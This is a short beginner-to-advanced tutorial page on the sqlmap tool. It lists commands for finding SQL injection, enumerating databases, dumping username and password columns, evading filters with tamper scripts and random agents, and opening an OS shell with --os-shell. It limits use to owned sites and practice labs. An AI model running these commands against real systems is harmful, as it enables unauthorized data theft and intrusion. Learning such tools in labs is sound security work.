⚡ SQLMap Guide - ZeroTrace

⚠️ First Rule

Use sqlmap only on:

  • Your own websites
  • DVWA
  • bWAPP
  • OWASP Juice Shop

👉 Never test random sites without permission.

💻 What is SQLMap?

SQLMap is an automatic tool that:

  • Finds SQL Injection vulnerabilities
  • Exploits them
  • Extracts database data

🚀 LEVEL 1: Beginner

Basic Scan

sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1"

Get Databases

sqlmap -u "URL" --dbs

Get Tables

sqlmap -u "URL" -D database_name --tables

Dump Data

sqlmap -u "URL" -D database_name -T table_name --dump

🚀 LEVEL 2: Intermediate

sqlmap -u "URL" --data="username=admin&password=123" sqlmap -u "URL" --cookie="PHPSESSID=xyz" sqlmap -u "URL" --batch --threads=5 sqlmap -u "URL" --forms

🚀 LEVEL 3: Advanced

sqlmap -u "URL" --tamper=space2comment sqlmap -u "URL" --all sqlmap -u "URL" --current-db sqlmap -u "URL" --current-user sqlmap -u "URL" --os-shell sqlmap -u "URL" -D db -T users -C username,password --dump

🔥 LEVEL 4: Pro Usage

sqlmap -r request.txt sqlmap -u "URL" --crawl=2 sqlmap -u "URL" --random-agent sqlmap -u "URL" --delay=2

🧠 Real Workflow

  1. Find target (lab / allowed)
  2. Intercept using Burp Suite
  3. Save request
  4. Run sqlmap
  5. Enumerate DB
  6. Dump data
  7. Report vulnerability

💀 Common Errors

sudo apt update sudo apt install sqlmap sqlmap --version

⚡ Pro Tips

  • Always use --batch
  • Start slow, then increase threads
  • Don’t spam requests
  • Learn manual SQL injection
